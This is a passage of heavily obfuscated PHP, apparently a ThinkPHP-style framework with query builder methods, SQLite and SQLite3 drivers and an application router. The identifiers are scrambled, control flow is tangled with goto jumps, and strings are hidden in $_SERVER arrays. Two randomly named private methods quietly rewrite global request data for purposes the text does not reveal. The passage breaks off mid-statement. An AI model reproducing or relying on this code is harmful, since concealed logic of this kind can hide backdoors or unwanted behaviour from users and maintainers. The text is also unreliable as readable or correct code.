= $b¿‡–“ˆ ? $b¿‡–“ˆ : $CÔ«ãéê’Ô[180]; } elseif ($f‚’ˆù‹õ’) { if (is_string($d´µ•‰¯‡Î)) { $d´µ•‰¯‡Î = explode($CÔ«ãéê’Ô[47], $d´µ•‰¯‡Î); } $b¿‡–“ˆ = $this->getDbFields(); $d´µ•‰¯‡Î = $b¿‡–“ˆ ? array_diff($b¿‡–“ˆ, $d´µ•‰¯‡Î) : $d´µ•‰¯‡Î; } $this->options[$CÔ«ãéê’Ô[267]] = $d´µ•‰¯‡Î; return $this; } public function scope($BµÈ•ò¼¤× = '', $c‡´ÄÔÄÁÉ = NULL) { $f¡ŞÁƒÁ‰™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($f¡ŞÁƒÁ‰™[33] === $BµÈ•ò¼¤×) { if (isset($this->_scope[$f¡ŞÁƒÁ‰™[34]])) { $dŠ£Ò”¤ä = $this->_scope[$f¡ŞÁƒÁ‰™[34]]; } else { return $this; } } elseif (is_string($BµÈ•ò¼¤×)) { $b„ºÙ†ğš° = explode($f¡ŞÁƒÁ‰™[47], $BµÈ•ò¼¤×); $dŠ£Ò”¤ä = array(); foreach ($b„ºÙ†ğš° as $aêÂÏ¡Ì˜É) { if (!isset($this->_scope[$aêÂÏ¡Ì˜É])) { continue; } $dŠ£Ò”¤ä = array_merge($dŠ£Ò”¤ä, $this->_scope[$aêÂÏ¡Ì˜É]); } if (!empty($c‡´ÄÔÄÁÉ) && is_array($c‡´ÄÔÄÁÉ)) { $dŠ£Ò”¤ä = array_merge($dŠ£Ò”¤ä, $c‡´ÄÔÄÁÉ); } } elseif (is_array($BµÈ•ò¼¤×)) { $dŠ£Ò”¤ä = $BµÈ•ò¼¤×; } if (is_array($dŠ£Ò”¤ä) && !empty($dŠ£Ò”¤ä)) { $this->options = array_merge($this->options, array_change_key_case($dŠ£Ò”¤ä)); } return $this; } public function where($C”£ï…˜ˆ¬, $c—ˆİÙöé„ = null) { $Fï·ŠÇƒïŒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!is_null($c—ˆİÙöé„) && is_string($C”£ï…˜ˆ¬)) { if (!is_array($c—ˆİÙöé„)) { $c—ˆİÙöé„ = func_get_args(); array_shift($c—ˆİÙöé„); } $c—ˆİÙöé„ = array_map(array($this->db, $Fï·ŠÇƒïŒ[337]), $c—ˆİÙöé„); $C”£ï…˜ˆ¬ = vsprintf($C”£ï…˜ˆ¬, $c—ˆİÙöé„); } elseif (is_object($C”£ï…˜ˆ¬)) { $C”£ï…˜ˆ¬ = get_object_vars($C”£ï…˜ˆ¬); } elseif (is_array($C”£ï…˜ˆ¬)) { foreach ($C”£ï…˜ˆ¬ as $BÀ‡Î…É‰° => $dó¸¥»¸âí) { if ((is_numeric($BÀ‡Î…É‰°) || !$BÀ‡Î…É‰°) && is_string($dó¸¥»¸âí)) { if (strpos($dó¸¥»¸âí, $Fï·ŠÇƒïŒ[344]) === 0) { continue; } think_trace($Fï·ŠÇƒïŒ[345], $Fï·ŠÇƒïŒ[33], $Fï·ŠÇƒïŒ[46]); die; } } } if (is_string($C”£ï…˜ˆ¬) && $Fï·ŠÇƒïŒ[33] != $C”£ï…˜ˆ¬) { $e‘¨øÚï™ = array(); $e‘¨øÚï™[$Fï·ŠÇƒïŒ[346]] = $C”£ï…˜ˆ¬; $C”£ï…˜ˆ¬ = $e‘¨øÚï™; } if (isset($this->options[$Fï·ŠÇƒïŒ[269]])) { $this->options[$Fï·ŠÇƒïŒ[269]] = array_merge($this->options[$Fï·ŠÇƒïŒ[269]], $C”£ï…˜ˆ¬); } else { $this->options[$Fï·ŠÇƒïŒ[269]] = $C”£ï…˜ˆ¬; } return $this; } public function limit($fğóÓßŞÜ, $fœÔÒ³›Š™ = null) { $dŞ´á¦«Éƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->options[$dŞ´á¦«Éƒ[286]] = is_null($fœÔÒ³›Š™) ? $fğóÓßŞÜ : $fğóÓßŞÜ . $dŞ´á¦«Éƒ[47] . $fœÔÒ³›Š™; return $this; } public function page($a†¾å®Ö«, $c‘Ÿ×§ = null) { $d¯›…Â¼¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->options[$d¯›…Â¼¦[347]] = is_null($c‘Ÿ×§) ? $a†¾å®Ö« : $a†¾å®Ö« . $d¯›…Â¼¦[47] . $c‘Ÿ×§; return $this; } public function comment($FÜ£…¢™Š) { $this->options[$_SERVER[ÈİÅ¿ÈÈ¥×][348]] = $FÜ£…¢™Š; return $this; } public function setProperty($F±‘á½™ĞË, $b¶éã¸ã¼) { if (property_exists($this, $F±‘á½™ĞË)) { $this->{$F±‘á½™ĞË} = $b¶éã¸ã¼; } return $this; } } goto dÁÖ°éË°ì; eîÕƒ›Şâ·: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto c—Û‡‚Âæ‘; c—Û‡‚Âæ‘: $FàÜÉÓºø´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; global $in, $config; $this->config =& $config; goto FºšóŞ†«; FºšóŞ†«: $this->in =& $in; $this->values[$FàÜÉÓºø´[6]] =& $config; $this->values[$FàÜÉÓºø´[7]] =& $in; goto FŠİ¬Â¶Ş; FŠİ¬Â¶Ş: $this->tpl = TEMPLATE . MOD . $FàÜÉÓºø´[8]; $this->_classObjectID = mt_rand(0, 10000); goto a©×à‰ôÕ´; a©×à‰ôÕ´: } public function loadClass($D¯çá‰ÓÑ) { if (1 === func_num_args()) { $this->{$D¯çá‰ÓÑ} = new $D¯çá‰ÓÑ(); } else { $D‘•ŞÃ÷ğò = new ReflectionClass($D¯çá‰ÓÑ); $CÕ“¸ ‡á = func_get_args(); array_shift($CÕ“¸ ‡á); $this->{$D¯çá‰ÓÑ} = $D‘•ŞÃ÷ğò->newInstanceArgs($CÕ“¸ ‡á); } return $this->{$D¯çá‰ÓÑ}; } protected function assign($aé™ñØùÕÛ, $bîï©µ–ÉÍ) { $this->values[$aé™ñØùÕÛ] = $bîï©µ–ÉÍ; } protected function display($BÍÙ°Ñ´¾Ë) { ob_end_clean(); extract($this->values); require $this->tpl . $BÍÙ°Ñ´¾Ë; } } class DbSqliteBase extends Db { public function __construct($A·¬‰Ó…¹ù = '') { $cÊ‘Ñ‰µ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!extension_loaded($cÊ‘Ñ‰µ[9])) { think_exception(think_lang($cÊ‘Ñ‰µ[10]) . $cÊ‘Ñ‰µ[11]); } if (!empty($A·¬‰Ó…¹ù)) { if (!isset($A·¬‰Ó…¹ù[$cÊ‘Ñ‰µ[12]])) { $A·¬‰Ó…¹ù[$cÊ‘Ñ‰µ[12]] = 438; } $this->config = $A·¬‰Ó…¹ù; if (empty($this->config[$cÊ‘Ñ‰µ[13]])) { $this->config[$cÊ‘Ñ‰µ[13]] = array(); } } } public function connect($F„ßœÎ÷…¼ = '', $DÇ•êæ³µæ = 0) { $dù¯¸ÚŒŠˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($this->linkID[$DÇ•êæ³µæ])) { goto CÖ›§­ªÇ; eó©¦ÓŞññ: @sqlite_busy_timeout($this->linkID[$DÇ•êæ³µæ], 30000); if (1 != think_config($dù¯¸ÚŒŠˆ[18])) { unset($this->config); } goto E½ÒæŸÈ¥Ü; EÀœ²ù’×–: $this->linkID[$DÇ•êæ³µæ] = $FŒÑŒÇŒ‚»($F„ßœÎ÷…¼[$dù¯¸ÚŒŠˆ[17]], $F„ßœÎ÷…¼[$dù¯¸ÚŒŠˆ[12]]); if (!$this->linkID[$DÇ•êæ³µæ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto eó©¦ÓŞññ; CÖ›§­ªÇ: if (empty($F„ßœÎ÷…¼)) { $F„ßœÎ÷…¼ = $this->config; } $AîàĞ„Š† = !empty($F„ßœÎ÷…¼[$dù¯¸ÚŒŠˆ[13]][$dù¯¸ÚŒŠˆ[14]]) ? $F„ßœÎ÷…¼[$dù¯¸ÚŒŠˆ[13]][$dù¯¸ÚŒŠˆ[14]] : $this->pconnect; $FŒÑŒÇŒ‚» = $AîàĞ„Š† ? $dù¯¸ÚŒŠˆ[15] : $dù¯¸ÚŒŠˆ[16]; goto EÀœ²ù’×–; E½ÒæŸÈ¥Ü: } return $this->linkID[$DÇ•êæ³µæ]; } public function free() { $this->queryID = null; } public function query($c¶ÚÂÔîŒÄ) { goto CÒ‰µƒñÃ¾; bùãŠ¥ÈÖ²: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $DÂÌˆÍß«ó = $this->getAll(); return $DÂÌˆÍß«ó; } goto dËğÆæ«ßö; eÁÁè»¦±—: think_status($Dæš•Ô±†–[20]); $this->queryID = sqlite_query($this->_linkID, $c¶ÚÂÔîŒÄ); $this->debug(); goto bùãŠ¥ÈÖ²; CÒ‰µƒñÃ¾: $Dæš•Ô±†– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aŠÕÏâ©Í´; aŠÕÏâ©Í´: $this->queryStr = $c¶ÚÂÔîŒÄ; if ($this->queryID) { $this->free(); } think_action_status($Dæš•Ô±†–[19], 1); goto eÁÁè»¦±—; dËğÆæ«ßö: } public function execute($CÄ™›„£) { goto c‘Ô©“Ë„; B±…’Í›ğÌ: think_status($A†Š³Í¦Ãî[20]); $D–¹°ß¿éª = sqlite_exec($this->_linkID, $CÄ™›„£); $this->debug(); goto Fäœñˆ™¥; c‘Ô©“Ë„: $A†Š³Í¦Ãî =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e¼ò‰í­ÁÊ; Fäœñˆ™¥: if (!1 === $D–¹°ß¿éª) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b™ĞëáÅÓÜ; e¼ò‰í­ÁÊ: $this->queryStr = $CÄ™›„£; if ($this->queryID) { $this->free(); } think_action_status($A†Š³Í¦Ãî[21], 1); goto B±…’Í›ğÌ; b™ĞëáÅÓÜ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÈİÅ¿ÈÈ¥×][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F·Èİø‹˜– = sqlite_query($this->_linkID, $_SERVER[ÈİÅ¿ÈÈ¥×][23]); if (!$F·Èİø‹˜–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AÙÎñÜçº… = sqlite_query($this->_linkID, $_SERVER[ÈİÅ¿ÈÈ¥×][24]); if (!$AÙÎñÜçº…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Eİ®Îâ¾ÓŸ = array(); if ($this->numRows > 0) { for ($fÊ™½Å¥ğØ = 0; $fÊ™½Å¥ğØ < $this->numRows; $fÊ™½Å¥ğØ++) { $Eİ®Îâ¾ÓŸ[$fÊ™½Å¥ğØ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Eİ®Îâ¾ÓŸ; } public function getFields($b¬ºª†Î·…) { $AÃ„¯ §ƒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÃ‚­…²ª = $this->query($AÃ„¯ §ƒ[25] . $b¬ºª†Î·… . $AÃ„¯ §ƒ[26]); $Eê‚¤‰«•ê = array(); if ($eÃ‚­…²ª) { foreach ($eÃ‚­…²ª as $DÛŠŸ‹ƒµÍ => $cˆà–ÜˆÆ¸) { $Eê‚¤‰«•ê[$cˆà–ÜˆÆ¸[$AÃ„¯ §ƒ[27]]] = array($AÃ„¯ §ƒ[28] => $cˆà–ÜˆÆ¸[$AÃ„¯ §ƒ[27]], $AÃ„¯ §ƒ[29] => $cˆà–ÜˆÆ¸[$AÃ„¯ §ƒ[30]], $AÃ„¯ §ƒ[31] => (bool) ($cˆà–ÜˆÆ¸[$AÃ„¯ §ƒ[32]] === $AÃ„¯ §ƒ[33]), $AÃ„¯ §ƒ[34] => $cˆà–ÜˆÆ¸[$AÃ„¯ §ƒ[35]], $AÃ„¯ §ƒ[36] => strtolower($cˆà–ÜˆÆ¸[$AÃ„¯ §ƒ[37]]) == $AÃ„¯ §ƒ[38], $AÃ„¯ §ƒ[39] => strtolower($cˆà–ÜˆÆ¸[$AÃ„¯ §ƒ[40]]) == $AÃ„¯ §ƒ[41]); } } return $Eê‚¤‰«•ê; } public function getTables($cŠ×Ú¨Ñ´ø = '') { $E„ÏÏéÖ › =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a±»¢¾ˆ×Ò = $this->query($E„ÏÏéÖ ›[42] . $E„ÏÏéÖ ›[43] . $E„ÏÏéÖ ›[44]); $cîœ²Œˆê = array(); foreach ($a±»¢¾ˆ×Ò as $cùóİ‘¤šš => $C§‹ÖøáŞ™) { $cîœ²Œˆê[$cùóİ‘¤šš] = current($C§‹ÖøáŞ™); } return $cîœ²Œˆê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $B¨¹Ù®¨²¾ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aã“‘ö‘è = sqlite_last_error($this->_linkID); $this->error = $aã“‘ö‘è . $B¨¹Ù®¨²¾[4] . sqlite_error_string($aã“‘ö‘è); if ($B¨¹Ù®¨²¾[33] != $this->queryStr) { $this->error .= LNG($B¨¹Ù®¨²¾[45]) . $this->queryStr; } think_trace($this->error, $B¨¹Ù®¨²¾[33], $B¨¹Ù®¨²¾[46]); return $this->error; } public function escapeString($d‹Ü¢¹È„) { return sqlite_escape_string($d‹Ü¢¹È„); } public function parseLimit($d¦‘–ù›“) { $c¥±ˆ¸‡÷Ü =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÙóøŠò = $c¥±ˆ¸‡÷Ü[33]; if (!empty($d¦‘–ù›“)) { $d¦‘–ù›“ = explode($c¥±ˆ¸‡÷Ü[47], $d¦‘–ù›“); if (count($d¦‘–ù›“) > 1) { $cÙóøŠò .= $c¥±ˆ¸‡÷Ü[48] . $d¦‘–ù›“[1] . $c¥±ˆ¸‡÷Ü[49] . $d¦‘–ù›“[0] . $c¥±ˆ¸‡÷Ü[50]; } else { $cÙóøŠò .= $c¥±ˆ¸‡÷Ü[48] . $d¦‘–ù›“[0] . $c¥±ˆ¸‡÷Ü[50]; } } return $cÙóøŠò; } } class DbSqlite3Base extends Db { public function __construct($e…ÕĞ”¦¹ = '') { $aÑ¡‹Ï‡œë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!class_exists($aÑ¡‹Ï‡œë[51])) { think_exception(think_lang($aÑ¡‹Ï‡œë[10]) . $aÑ¡‹Ï‡œë[52]); } if (!empty($e…ÕĞ”¦¹)) { if (!isset($e…ÕĞ”¦¹[$aÑ¡‹Ï‡œë[12]])) { $e…ÕĞ”¦¹[$aÑ¡‹Ï‡œë[12]] = 438; } $this->config = $e…ÕĞ”¦¹; if (empty($this->config[$aÑ¡‹Ï‡œë[13]])) { $this->config[$aÑ¡‹Ï‡œë[13]] = array(); } } } public function connect($f‘¸“Ò² = '', $eÛ ˆ‘‡–Ê = 0) { $bÙëâ±£”° =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($this->linkID[$eÛ ˆ‘‡–Ê])) { if (empty($f‘¸“Ò²)) { $f‘¸“Ò² = $this->config; } $this->linkID[$eÛ ˆ‘‡–Ê] = new SQLite3($f‘¸“Ò²[$bÙëâ±£”°[17]]); if (!$this->linkID[$eÛ ˆ‘‡–Ê]) { think_exception($this->linkID[$eÛ ˆ‘‡–Ê]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$eÛ ˆ‘‡–Ê]->busyTimeout(30000); if (1 != think_config($bÙëâ±£”°[18])) { unset($this->config); } } return $this->linkID[$eÛ ˆ‘‡–Ê]; } public function free() { $this->queryID = null; } public function query($FÏ§õª™) { goto AİÉ¼™Îœ³; AİÉ¼™Îœ³: $E¢çºàŸ„„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fØê·ŒÏøÇ; b»ïåÕçÈ…: think_status($E¢çºàŸ„„[20]); $this->queryID = $this->_linkID->query($FÏ§õª™); $this->debug(); goto A«»øÊÈ»Õ; fØê·ŒÏøÇ: $this->queryStr = $FÏ§õª™; if ($this->queryID) { $this->free(); } think_action_status($E¢çºàŸ„„[19], 1); goto b»ïåÕçÈ…; A«»øÊÈ»Õ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $f•îçØŠ¯¶ = $this->getAll(); $this->numRows = count($f•îçØŠ¯¶); return $f•îçØŠ¯¶; } goto bËğö¦×àİ; bËğö¦×àİ: } public function execute($bˆÁÊ‰ªì–) { goto d²¹‰·÷Üß; d²¹‰·÷Üß: $bŠÀŒà± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e¬‘ô³¿³å; e¬‘ô³¿³å: $this->queryStr = $bˆÁÊ‰ªì–; if ($this->queryID) { $this->free(); } think_action_status($bŠÀŒà±[21], 1); goto F’À–—«‚; F’À–—«‚: think_status($bŠÀŒà±[20]); $BæƒŸÁ” ‘ = $this->_linkID->exec($bˆÁÊ‰ªì–); $this->debug(); goto B–ôšä©‰ç; B–ôšä©‰ç: if (!1 === $BæƒŸÁ” ‘) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto F¸å”ñ; F¸å”ñ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÈİÅ¿ÈÈ¥×][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eä½º‹åÛù = $this->_linkID->query($_SERVER[ÈİÅ¿ÈÈ¥×][23]); if (!$Eä½º‹åÛù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÆ¾âÎÏ¾Á = $this->_linkID->query($_SERVER[ÈİÅ¿ÈÈ¥×][24]); if (!$FÆ¾âÎÏ¾Á) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $DÖ®ˆãñÀ§ = array(); while ($dƒâ‹÷ïã– = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $DÖ®ˆãñÀ§[] = $dƒâ‹÷ïã–; } $this->queryID->reset(); return $DÖ®ˆãñÀ§; } public function getFields($CˆÖèÈ–¡¦) { $Eƒ²ìåõ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eŸ¡Š×õÛÕ = $this->query($Eƒ²ìåõ[25] . $CˆÖèÈ–¡¦ . $Eƒ²ìåõ[26]); $A£ÖªŒÁ‹ = array(); if ($eŸ¡Š×õÛÕ) { foreach ($eŸ¡Š×õÛÕ as $Dœ©ï„â°„ => $DÑí“ï‡–ó) { $A£ÖªŒÁ‹[$DÑí“ï‡–ó[$Eƒ²ìåõ[28]]] = array($Eƒ²ìåõ[28] => $DÑí“ï‡–ó[$Eƒ²ìåõ[28]], $Eƒ²ìåõ[29] => $DÑí“ï‡–ó[$Eƒ²ìåõ[29]], $Eƒ²ìåõ[31] => (bool) ($DÑí“ï‡–ó[$Eƒ²ìåõ[31]] === $Eƒ²ìåõ[33]), $Eƒ²ìåõ[34] => $DÑí“ï‡–ó[$Eƒ²ìåõ[53]], $Eƒ²ìåõ[36] => (bool) $DÑí“ï‡–ó[$Eƒ²ìåõ[54]], $Eƒ²ìåõ[39] => (bool) $DÑí“ï‡–ó[$Eƒ²ìåõ[54]]); } } return $A£ÖªŒÁ‹; } public function getTables($cíÜ¯±ƒ© = '') { $cª¨¾¶ç‰‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cšš„õãøÕ = $this->query($cª¨¾¶ç‰‚[42] . $cª¨¾¶ç‰‚[43] . $cª¨¾¶ç‰‚[44]); $cˆ‡§‰ä = array(); foreach ($Cšš„õãøÕ as $CîËíì‡» => $aÛ¾ó¨ß¨) { $cˆ‡§‰ä[$CîËíì‡»] = current($aÛ¾ó¨ß¨); } return $cˆ‡§‰ä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Eõµ²‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->error = $this->_linkID->lastErrorMsg(); if ($Eõµ²‰[33] != $this->queryStr) { $this->error .= LNG($Eõµ²‰[45]) . $this->queryStr; } think_trace($this->error, $Eõµ²‰[33], $Eõµ²‰[46]); return $this->error; } public function escapeString($a‰ï‘¬¢š²) { $b–¯è–ËÆš =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->_linkID) { return $this->_linkID->escapeString($a‰ï‘¬¢š²); } return str_ireplace($b–¯è–ËÆš[55], $b–¯è–ËÆš[56], $a‰ï‘¬¢š²); } public function parseLimit($Bõ†Ü °ŠË) { $EÀÉ¯ù„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B²‰®×†Æ· = $EÀÉ¯ù„[33]; if (!empty($Bõ†Ü °ŠË)) { $Bõ†Ü °ŠË = explode($EÀÉ¯ù„[47], $Bõ†Ü °ŠË); if (count($Bõ†Ü °ŠË) > 1) { $B²‰®×†Æ· .= $EÀÉ¯ù„[48] . $Bõ†Ü °ŠË[1] . $EÀÉ¯ù„[49] . $Bõ†Ü °ŠË[0] . $EÀÉ¯ù„[50]; } else { $B²‰®×†Æ· .= $EÀÉ¯ù„[48] . $Bõ†Ü °ŠË[0] . $EÀÉ¯ù„[50]; } } return $B²‰®×†Æ·; } } goto E»âóØÂÒ’; dæ±Ë¥íù: $bƒìÂÑæ½ = $_SERVER[ÈİÅ¿ÈÈ¥×][567]; while ($bƒìÂÑæ½ < $_SERVER[ÈİÅ¿ÈÈ¥×][568]) { if ($bƒìÂÑæ½ >= 0) { break; } $bƒìÂÑæ½++; } class Application { private $defaultModule = "\x69\x6e\144\x65\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($cøïšà—½È) { goto EµºÂŠ–´Ó; d¯¤Üù¹: $BîôÛƒÒï¦ = $FÖÉ’ì©Î¼[570]; while (strlen($BîôÛƒÒï¦) < $FÖÉ’ì©Î¼[568]) { if (!$BîôÛƒÒï¦) { break; } $BîôÛƒÒï¦++; } $this->defaultAction = $d³—•¢¡†Ú[2] ? $d³—•¢¡†Ú[2] : $this->defaultAction; goto aê„í‚À’; aê„í‚À’: $BÃä®¡Ïïã = $FÖÉ’ì©Î¼[571]; if (!$BÃä®¡Ïïã) { die; } $this->{$_SERVER[şìšµëâ­Æ][3]}($Eì¥ß­ÜÙ [4], array($this, $Eì¥ß­ÜÙ [5])); goto cïÛÄÕòÀÌ; EµºÂŠ–´Ó: $FÖÉ’ì©Î¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eì¥ß­ÜÙ  =& $_SERVER[şìšµëâ­Æ]; $d³—•¢¡†Ú = $Eì¥ß­ÜÙ [0]($Eì¥ß­ÜÙ [1], $Eì¥ß­ÜÙ [2]($cøïšà—½È, $Eì¥ß­ÜÙ [1])); goto c·”†÷ßŸƒ; c·”†÷ßŸƒ: $B²¨µ‘ÆŞ = $FÖÉ’ì©Î¼[569]; $this->defaultModule = $d³—•¢¡†Ú[0] ? $d³—•¢¡†Ú[0] : $this->defaultModule; $this->defaultController = $d³—•¢¡†Ú[1] ? $d³—•¢¡†Ú[1] : $this->defaultController; goto d¯¤Üù¹; cïÛÄÕòÀÌ: } public function appRun($B›Ó•¡‡Ã) { goto bô÷Ïê§†ğ; bô÷Ïê§†ğ: $aˆß˜¨Á´  =& $_SERVER[şìšµëâ­Æ]; $AÖ‰¼µ¸†à = $aˆß˜¨Á´ [0]($aˆß˜¨Á´ [1], $B›Ó•¡‡Ã); $FÊ»ªÃ¹‰ò = $aˆß˜¨Á´ [6]($AÖ‰¼µ¸†à[0]); goto b÷óàêäÌµ; fÍïŞ³: $aˆß˜¨Á´ [17]($B›Ó•¡‡Ã); $aˆß˜¨Á´ [13](array($aˆß˜¨Á´ [14], $aˆß˜¨Á´ [15]), $b°ìÈ§–„“ . $aˆß˜¨Á´ [18], $B›Ó•¡‡Ã); goto a…‘±Ç–Ç; b÷óàêäÌµ: $b°ìÈ§–„“ = $aˆß˜¨Á´ [7]; if ($FÊ»ªÃ¹‰ò == $aˆß˜¨Á´ [8]) { $b°ìÈ§–„“ = $aˆß˜¨Á´ [9]; $AÖ‰¼µ¸†à[0] = $aˆß˜¨Á´ [10]; $AÖ‰¼µ¸†à[1] = $AÖ‰¼µ¸†à[1] . $aˆß˜¨Á´ [11]; $B›Ó•¡‡Ã = $aˆß˜¨Á´ [12]($aˆß˜¨Á´ [1], $AÖ‰¼µ¸†à); $B›Ó•¡‡Ã = $aˆß˜¨Á´ [2]($B›Ó•¡‡Ã, $aˆß˜¨Á´ [1]); } $aˆß˜¨Á´ [13](array($aˆß˜¨Á´ [14], $aˆß˜¨Á´ [15]), $b°ìÈ§–„“ . $aˆß˜¨Á´ [16], $B›Ó•¡‡Ã); goto fÍïŞ³; a…‘±Ç–Ç: } private function autorun() { $DÛ‚†…Ğ´† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CñªùŞç‚ =& $_SERVER[şìšµëâ­Æ]; global $config; if ($CñªùŞç‚[19]($config[$CñªùŞç‚[20]]) == 0) { return; } foreach ($config[$CñªùŞç‚[20]] as $DòàÎ©ªœ’ => $A¨ß­¶) { $this->{$_SERVER[şìšµëâ­Æ][21]}($A¨ß­¶); $F»¶º¸Ü¸ø = $DÛ‚†…Ğ´†[572]; if (strlen($F»¶º¸Ü¸ø) < $DÛ‚†…Ğ´†[573]) { return; } } } private function fbsq6d35fa09() { goto c‹éŸ–¾ù³; e·ï¿Ôõî¬: if (!$CË‘ì™Äôë || $Cº¡ÖáİŞõ[24]($CË‘ì™Äôë) <= $Cº¡ÖáİŞõ[24]($eà§ğŠÇÃÈ)) { return; } if ($Cº¡ÖáİŞõ[6]($Cº¡ÖáİŞõ[25]($CË‘ì™Äôë, -$Cº¡ÖáİŞõ[24]($eà§ğŠÇÃÈ))) != $eà§ğŠÇÃÈ) { return; } $eÊ÷ÈÄ·‡Ø = $Cº¡ÖáİŞõ[25]($CË‘ì™Äôë, 0, -$Cº¡ÖáİŞõ[24]($eà§ğŠÇÃÈ)); goto E“Î„“‡¶‚; A¿ÕÌˆ¤‚ƒ: $CË‘ì™Äôë = $GLOBALS[$Cº¡ÖáİŞõ[22]][$Cº¡ÖáİŞõ[23]][0]; $BÖÉÓÒ‹¢± = $b„–‡²Èªğ[574]; if (strlen($BÖÉÓÒ‹¢±) < $b„–‡²Èªğ[564]) { die; } goto e·ï¿Ôõî¬; E“Î„“‡¶‚: $dğœğÍ„â” = $b„–‡²Èªğ[575]; while ($dğœğÍ„â” < $b„–‡²Èªğ[564]) { if ($dğœğÍ„â” >= 0) { break; } $dğœğÍ„â”++; } $fĞã¨¬ôá = array($Cº¡ÖáİŞõ[8], $eÊ÷ÈÄ·‡Ø); goto fÏË¡ìóÈ; fÏË¡ìóÈ: $EŸÉÃÏ¹¨Ö = $b„–‡²Èªğ[576]; if (strlen($EŸÉÃÏ¹¨Ö) < $b„–‡²Èªğ[564]) { return; } $D‘¡µ¢Î•¹ = $Cº¡ÖáİŞõ[26]($GLOBALS[$Cº¡ÖáİŞõ[22]][$Cº¡ÖáİŞõ[23]], 1); goto D»ğåğõÅ­; c‹éŸ–¾ù³: $b„–‡²Èªğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cº¡ÖáİŞõ =& $_SERVER[şìšµëâ­Æ]; $eà§ğŠÇÃÈ = $Cº¡ÖáİŞõ[8]; goto A¿ÕÌˆ¤‚ƒ; D»ğåğõÅ­: $GLOBALS[$Cº¡ÖáİŞõ[22]][$Cº¡ÖáİŞõ[23]] = $Cº¡ÖáİŞõ[27]($fĞã¨¬ôá, $D‘¡µ¢Î•¹); $GLOBALS[$Cº¡ÖáİŞõ[22]][$Cº¡ÖáİŞõ[28]] = $Cº¡ÖáİŞõ[29]($Cº¡ÖáİŞõ[1], $GLOBALS[$Cº¡ÖáİŞõ[22]][$Cº¡ÖáİŞõ[23]]); $a¾ĞïµÅÓ° = $b„–‡²Èªğ[577]; goto d•¸æ±âÎ; d•¸æ±âÎ: } private function tcalbd993f6e() { goto EÁ›ÕÏƒ‘; A‚ÔéÄË‚‘: while ($B¢œÔàÃ < $e¯‘­ìŒ[579]) { if ($B¢œÔàÃ >= 0) { break; } $B¢œÔàÃ++; } $aéÒŞÜì©±[34]($aéÒŞÜì©±[35], $E£ìäÓó…, $e¬°³®š); $E£ìäÓó… = $aéÒŞÜì©±[2]($e¬°³®š[0][0], $aéÒŞÜì©±[36]); goto B²Ò«Ä÷Şâ; EÁ›ÕÏƒ‘: $e¯‘­ìŒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aéÒŞÜì©± =& $_SERVER[şìšµëâ­Æ]; if ($GLOBALS[$aéÒŞÜì©±[22]][$aéÒŞÜì©±[28]] != $aéÒŞÜì©±[10]) { return; } goto fÖòêÇ”Î; fÖòêÇ”Î: $cÄÕÓœ£’ = $_SERVER[$aéÒŞÜì©±[30]]; $bÌêÕ©èÓÉ = $aéÒŞÜì©±[31]; if 